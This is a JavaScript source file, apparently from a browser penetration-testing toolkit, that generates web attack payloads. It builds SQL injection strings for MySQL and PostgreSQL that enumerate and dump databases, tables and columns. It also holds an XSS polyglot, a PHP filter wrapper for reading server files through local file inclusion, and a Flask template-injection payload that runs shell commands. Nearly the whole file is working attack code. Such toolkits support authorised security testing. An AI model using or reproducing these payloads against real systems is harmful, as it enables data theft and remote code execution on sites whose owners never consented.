window.Payload = {}

window.Payload.SQLi = {
  spaceToComment: value => value.replace(/[^\S\r\n]+/g, '/**/'),

  polyglot: value => "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",

  MySQL: {
    unionSelect: ({ columns, position }) => {
      columns = parseInt(columns)
      if (isNaN(columns) === true) {
        return ''
      }

      return 'union select ' +
        Array.from(Array(columns + 1).keys()).slice(1).join(',')
    },

    dumpDatabases: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      let fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(schema_name)'

      return 'union select ' + fields.join(',') +
        ' from information_schema.schemata'
    },

    dumpTables: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      let fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(table_name)'

      return 'union select ' + fields.join(',') +
        ' from information_schema.tables where table_schema=database()'
    },

    dumpColumns: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      let fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(column_name)'

      return 'union select ' + fields.join(',') +
        ' from information_schema.columns where table_schema=database()'
    },

    errorBased: ({ columns, position }) => {
      return 'extractvalue(0x0a,concat(0x0a,(select database())))'
    }
  },

  PostgreSQL: {
    unionSelect: ({ columns, position }) => {
      columns = parseInt(columns)
      if (isNaN(columns) === true) {
        return ''
      }

      return 'union select ' + Array(columns).fill('null').join(',')
    },

    dumpDatabases: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      let fields = Array(columns).fill('null')
      fields[position - 1] = "string_agg(datname, ',')"

      return 'union select ' + fields.join(',') + ' from pg_database'
    },

    dumpTables: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      let fields = Array(columns).fill('null')
      fields[position - 1] = "string_agg(tablename, ',')"

      return ' union select ' + fields.join(',') +
        " from pg_tables where schemaname='public'"
    },

    dumpColumns: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      let fields = Array(columns).fill('null')
      fields[position - 1] = "string_agg(column_name, ',')"

      return 'union select ' + fields.join(',') +
        " from information_schema.columns where table_schema='public'"
    },

    errorBased: ({ columns, position }) => {
      return 'cast(version() as int)'
    }
  }
}

window.Payload.XSS = {
  polyglot: value => "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
}

window.Payload.LFI = {
  phpWrapperBas64: value => 'php://filter/convert.base64-encode/resource=' + value
}

window.Payload.SSTI = {
  flaskRCE: value => {
    // Reference: https://twitter.com/realgam3/status/1184747565415358469
    return "{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}"
  }
}
